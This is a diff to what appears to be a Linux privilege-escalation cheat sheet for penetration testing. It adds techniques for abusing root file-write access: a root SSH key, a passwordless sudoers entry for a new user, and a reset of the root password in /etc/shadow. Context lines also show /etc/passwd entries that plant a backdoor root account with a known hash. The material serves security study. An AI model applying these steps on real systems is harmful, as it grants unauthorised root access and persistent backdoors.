@@ -202,6 +202,25 @@ What folder can I write to?
 | /home/*USER*/             | Create an ssh key and copy it to the .ssh/authorized_keys folder the ssh into the account       |
 | /etc/passwd               | manually add a user with a password of "password" using the following syntax<br>user:$1$xtTrK/At$Ga7qELQGiIklZGDhc6T5J0:1000:1000:,,,:/home/user:/bin/bash <br> You can even escalate to the root user in some cases with the following syntax: <br> admin:$1$xtTrK/At$Ga7qELQGiIklZGDhc6T5J0:0:0:,,,:/root:/bin/bash                         |
 
+
+*Root SSH Key* If Root can login via SSH, then you might be able to find a method of adding a key to the /root/.ssh/authorized_keys file.  
+```
+cat /etc/ssh/sshd_config | grep PermitRootLogin
+```  
+*Add SUDOers* If we can write arbitrary files to the host as Root, it is possible to add users to the SUDO-ers group like so (NOTE: you will need to logout and login again as myuser):  
+/etc/sudoers  
+```
+root    ALL=(ALL:ALL) ALL
+%sudo   ALL=(ALL:ALL) ALL
+myuser	ALL=(ALL) NOPASSWD:ALL  
+```
+*Set Root Password* We can also change the root password on the host if we can write to any file as root:  
+/etc/shadow  
+```
+printf root:>shadown
+openssl passwd -1 -salt salty password >>shadow
+```
+
 ## Kernel Exploits
 
 Based on the Kernel version, do we have some reliable exploits that can be used?
